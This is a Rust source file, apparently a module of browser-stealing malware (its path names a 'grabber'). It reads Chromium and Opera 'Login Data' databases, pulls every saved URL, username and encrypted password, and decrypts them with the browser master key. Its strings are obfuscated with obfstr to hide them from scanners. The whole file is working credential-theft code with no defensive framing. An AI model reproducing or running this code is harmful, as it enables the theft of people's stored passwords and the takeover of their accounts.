use crate::browser::utils::{Profiles, Browser, is_opera};
use rusqlite::{params, Connection};
use obfstr::obfstr as obf;

pub fn get(browser: &Browser, profile: &str) -> Vec<String> {
    let password_path = is_opera(&browser.name, &browser.path, profile.to_string(), obf!("\\Login Data").to_string());

    if let Err(_) = std::fs::metadata(&password_path) {
        return Vec::new();
    }
    
    let mut passwords: Vec<String> = Vec::new();
    let conn = Connection::open(&password_path).unwrap();
    let mut stmt = conn
        .prepare(obf!("SELECT origin_url, username_value, password_value FROM logins"))
        .unwrap();
    let mut rows = stmt.query([]).unwrap();

    while let Ok(row_result) = rows.next() {
        if let Some(row) = row_result {
            let origin_url: String = row.get(0).unwrap();
            let username_value: String = row.get(1).unwrap();
            let password_value: Vec<u8> = row.get(2).unwrap();

            if let Ok(value) = crate::grabber::grabber::decrypt_tokens(&password_value, &browser.masterkey) {
                if !(origin_url.is_empty() || username_value.is_empty() || value.is_empty()) {
                    passwords.push(format!(
                        "{}\t{}\t{}",
                        origin_url,
                        username_value,
                        value,
                    ));
                }
            }
        } else {
            break;
        }
    }
    passwords
}